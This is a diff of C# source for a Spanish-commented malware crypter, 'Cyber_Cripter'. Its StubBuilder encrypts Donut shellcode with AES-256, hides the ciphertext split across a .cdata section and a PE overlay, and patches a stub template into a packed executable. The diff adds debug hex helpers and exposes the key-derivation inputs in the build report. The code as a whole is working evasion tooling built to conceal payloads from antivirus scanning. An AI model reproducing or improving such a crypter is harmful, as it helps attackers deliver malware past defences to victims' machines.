@@ -1,6 +1,8 @@
 using System;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
+using System.Text;
 
 namespace Cyber_Cripter
 {
@@ -8,10 +10,10 @@ namespace Cyber_Cripter
     // El proceso es:
     //   1. Localizar los dos slots de parcheo en el binario mediante sus magic bytes de 16 bytes.
     //   2. Generar aleatoriedad por build (heap_marker e IV).
-    //   3. Derivar la clave AES-256: SHA256(heap_marker || template[0..STABLE_REGION] || timestamp).
+    //   3. Derivar la clave con SHA256: SHA256(heap_marker | template[0..STABLE_REGION] | timestamp).
     //   4. Cifrar el shellcode con AES-256-CBC.
-    //   5. Dividir el ciphertext en half1 (embebido en .cdata) y half2 (overlay PE al final del fichero).
-    //   6. Escribir los metadatos y el ciphertext en el binario y guardarlo en disco.
+    //   5. Dividir el shellcode cifrado en half1 (embebido en .cdata) y half2 (overlay PE al final del fichero).
+    //   6. Escribir los metadatos y el shellcode cifrado en el binario y guardarlo en disco como ejecutable "_crypted.exe".
 
     internal static class StubBuilder
     {
@@ -22,8 +24,8 @@ namespace Cyber_Cripter
         public const int STABLE_REGION = 4096;
 
         // Capacidad máxima del buffer embebido en .cdata para half1. Debe coincidir con
-        // HALF1_MAX en stub/stub.c (1 MiB = 0x100000).
-        public const int HALF1_MAX = 0x100000;
+        // HALF1_MAX en stub/stub.c (500KiB = 0x7D000).
+        public const int HALF1_MAX = 0x7D000;
 
         // Secuencia de 16 bytes que identifica el inicio de la estructura StubMetadata en .cdata.
         // El stub también la usa para localizar sus propios metadatos en disco.
@@ -45,9 +47,9 @@ namespace Cyber_Cripter
         private const int OFF_IV          = 16 + 8 + 8;             // IV de AES, 16 bytes aleatorios
         private const int OFF_HALF1_SIZE  = 16 + 8 + 8 + 16;        // tamaño de half1 (u32 LE)
         private const int OFF_HALF2_SIZE  = 16 + 8 + 8 + 16 + 4;    // tamaño de half2 (u32 LE)
-        private const int OFF_HASH_REGION = 16 + 8 + 8 + 16 + 4 + 4; // bytes hasheados (u32 LE)
+        private const int OFF_HASH_REGION_SIZE = 16 + 8 + 8 + 16 + 4 + 4; // bytes hasheados (u32 LE)
 
-        // Resultado del build que se muestra en el panel de estado de la UI
+        // Información del build que se muestra en el panel de estado de la UI
         public sealed class BuildReport
         {
             public string OutputPath;       // ruta del fichero generado
@@ -55,21 +57,77 @@ namespace Cyber_Cripter
             public int    CiphertextBytes;  // tamaño del ciphertext tras AES
             public int    Half1Bytes;       // bytes embebidos en .cdata
             public int    Half2Bytes;       // bytes en el overlay PE
-            public ulong  Timestamp;        // Unix timestamp del build
+            
+            public string HeapMarkerHex;    // (input1 de la Key)
+            public int    StableRegion;     // (input2 de la key)
+            public ulong  Timestamp;        // Unix timestamp del build (input3 de la key)
             public string KeyHex;           // clave AES derivada en hex (solo educativo)
+            public string HashStableRegion;
+        }
+
+        // Función que convierte un hexadecimal a String en el mismo formato que el stub en C.
+        // -- Utilizada para DEBUGGAR valores
+        private static string ToHex(byte[] data)
+        {
+            StringBuilder sb = new StringBuilder(data.Length * 2);
+
+            foreach (byte b in data)
+                sb.AppendFormat("{0:X2}", b);
+
+            return sb.ToString();
+        }
+
+        // Función que obtiene un string en formato matriz hexadecimal, de un byte[]
+        // -- Utilizada para DEBUGGAR
+        private static string getHexStringMatrix(byte[] data)
+        {
+            StringBuilder sb = new StringBuilder(data.Length * 3);
+
+            for (int i = 0; i < data.Length; i++)
+            {
+                sb.AppendFormat("{0:X2}", data[i]);
+
+                if ((i + 1) % 16 == 0)
+                    sb.AppendLine();
+                else
+                    sb.Append(' ');
+            }
+
+            if (STABLE_REGION % 16 != 0)
+                sb.AppendLine();
+
+            return sb.ToString();
+        }
+
+        // Busca el magic marker en el array de bytes y devuelve su offset.
+        // Lanza excepción si no se encuentra o si aparece más de una vez (ambigüedad).
+        private static int FindUnique(byte[] templateBytes, byte[] magic, string label)
+        {
+            int found = -1;
+            int last = templateBytes.Length - magic.Length;
+            for (int i = 0; i <= last; i++)
+            {
+                bool match = true;
+                for (int j = 0; j < magic.Length; j++)
+                    if (templateBytes[i + j] != magic[j]) { match = false; break; }
+                if (!match) continue;
+                if (found != -1)
+                    throw new InvalidOperationException(label + " appears more than once in the stub template.");
+                found = i;
+            }
+            if (found == -1)
+                throw new InvalidOperationException(label + " not found in the stub template.");
+            return found;
         }
 
         /// <summary>
-        /// Construye el ejecutable final del crypter a partir de la plantilla del stub y
-        /// del shellcode generado por Donut. Durante el proceso localiza las regiones de
-        /// parcheo del stub, genera los metadatos del build, deriva la clave AES, cifra
-        /// el shellcode, divide el texto cifrado entre la sección embebida y el overlay
-        /// PE, parchea la plantilla con la información necesaria para su reconstrucción
-        /// en tiempo de ejecución y escribe el binario resultante en disco.
+        /// Construye el ejecutable final del crypter a partir de la plantilla del stub y del shellcode generado por Donut. Durante el proceso localiza las regiones de
+        /// parcheo del stub, genera los metadatos del build, deriva la clave AES, cifra el shellcode, divide el texto cifrado entre la sección embebida en .cdata y el 
+        /// overlay PE, parchea la plantilla con la información necesaria para su reconstrucción en tiempo de ejecución y escribe el binario resultante en disco.
         /// </summary>
         /// <param name="templateBytes">Plantilla binaria del stub que será parcheada.</param>
         /// <param name="shellcode">Shellcode generado por Donut que se desea utilizar.</param>
-        /// <param name="outputPath">Ruta donde se escribirá el ejecutable final.</param>
+        /// <param name="outputPath">Ruta en disco donde se escribirá el ejecutable final.</param>
         /// <returns>
         public static BuildReport Build(byte[] templateBytes, byte[] shellcode, string outputPath)
         {
@@ -103,6 +161,8 @@ namespace Cyber_Cripter
                 rng.GetBytes(iv);
             }
             ulong timestamp = (ulong)DateTimeOffset.UtcNow.ToUnixTimeSeconds();
+            byte[] hashStableRegion = Encryption.Sha256(templateBytes.Take(STABLE_REGION).ToArray());
+            
 
             // Derivar la clave AES-256 del mismo modo que lo hará el stub en runtime:
             // SHA256(heap_marker || templateBytes[0..STABLE_REGION] || timestamp)
@@ -123,7 +183,7 @@ namespace Cyber_Cripter
             Buffer.BlockCopy(iv,                                        0, templateBytes, metaOff + OFF_IV,          16);
             Buffer.BlockCopy(BitConverter.GetBytes((uint)half1Size),    0, templateBytes, metaOff + OFF_HALF1_SIZE,  4);
             Buffer.BlockCopy(BitConverter.GetBytes((uint)half2Size),    0, templateBytes, metaOff + OFF_HALF2_SIZE,  4);
-            Buffer.BlockCopy(BitConverter.GetBytes((uint)STABLE_REGION),0, templateBytes, metaOff + OFF_HASH_REGION, 4);
+            Buffer.BlockCopy(BitConverter.GetBytes((uint)STABLE_REGION),0, templateBytes, metaOff + OFF_HASH_REGION_SIZE, 4);
 
             // Escribir half1 en el buffer embebido de .cdata, justo después del magic
             Buffer.BlockCopy(ciphertext, 0, templateBytes, half1DataOff, half1Size);
@@ -147,30 +207,13 @@ namespace Cyber_Cripter
                 CiphertextBytes = ciphertext.Length,
                 Half1Bytes      = half1Size,
                 Half2Bytes      = half2Size,
+                HeapMarkerHex   = ToHex(heapMarker),
+                StableRegion    = STABLE_REGION,
                 Timestamp       = timestamp,
-                KeyHex          = BitConverter.ToString(key).Replace("-", "")
+                KeyHex          = ToHex(key),
+                HashStableRegion = getHexStringMatrix(hashStableRegion)
             };
         }
 
-        // Busca el magic marker en el array de bytes y devuelve su offset.
-        // Lanza excepción si no se encuentra o si aparece más de una vez (ambigüedad).
-        private static int FindUnique(byte[] hay, byte[] needle, string label)
-        {
-            int found = -1;
-            int last  = hay.Length - needle.Length;
-            for (int i = 0; i <= last; i++)
-            {
-                bool match = true;
-                for (int j = 0; j < needle.Length; j++)
-                    if (hay[i + j] != needle[j]) { match = false; break; }
-                if (!match) continue;
-                if (found != -1)
-                    throw new InvalidOperationException(label + " appears more than once in the stub template.");
-                found = i;
-            }
-            if (found == -1)
-                throw new InvalidOperationException(label + " not found in the stub template.");
-            return found;
-        }
     }
 }
